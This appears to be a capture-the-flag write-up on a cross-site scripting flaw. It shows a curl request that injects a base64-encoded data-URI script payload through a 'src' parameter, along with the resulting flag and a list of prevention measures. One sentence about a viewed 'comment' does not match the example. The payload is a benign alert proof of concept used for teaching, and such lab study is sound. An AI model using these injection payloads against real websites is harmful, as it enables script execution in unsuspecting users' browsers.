## CROSS SITE SCRIPTING

Cross-site Scripting (XSS) is another common security vulnerability in web applications. It occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing an attacker to execute malicious scripts in the browser of an unsuspecting user. This can lead to a variety of harmful outcomes, including session hijacking, personal data theft, and manipulation of web content. 


## Explanation

This example demonstrates a more complex form of Cross-site Scripting (XSS), particularly exploiting data URI schemes along with base64 encoding to execute JavaScript code via a URL. This example also involves using curl to make an HTTP request.

```
curl -X GET "http://10.12.181.103/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+" | grep flag 
```
Target URL: http://10.12.181.103/?page=media&src=...
Parameter Exploited: src
Payload: data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+
This is a base64-encoded string representing the HTML and JavaScript code: <script>alert('XSS');</script>.

```
Which results into getting the flag:

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2127    0  2127    0     0   398k      0 --:--:-- --:--:-- --:--:--  519k
<center><h2 style="margin-top:50px;"> The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center><table style="margin-top:-68px;"></table>
```
and the application directly incorporates this into its HTML output without sanitization, the script will execute in the browser of any user who views that comment.


## XSS  Details

XThis attack leverages a DOM-based XSS vulnerability:

Data URI with Base64 Encoding: The attacker uses a data URI (data:text/html;base64,) followed by base64-encoded data to inject a script directly into the page. This method allows the attacker to embed complete HTML/JavaScript content in a URL.
No Validation/Sanitization: The application does not validate or sanitize the src parameter, allowing it to be used to inject arbitrary content into the web page.


## Prevention and Mitigation Strategies

To mitigate such vulnerabilities, consider the following measures:

Sanitize and Validate Input: Always sanitize and validate all inputs, especially those that can influence HTML content or JavaScript execution. This includes parameters like src that might accept URLs or data URIs.
Content Security Policy (CSP): Implement a strict CSP to prevent the execution of inline scripts and restrict resources to trusted domains. This would block malicious data URIs.
Use HTTP Headers: Set HTTP headers such as X-Content-Type-Options: nosniff and X-XSS-Protection: 1; mode=block to help prevent XSS attacks.
Regular Audits and Testing: Regularly audit your code for XSS vulnerabilities and conduct penetration testing to ensure that mitigation strategies are effective.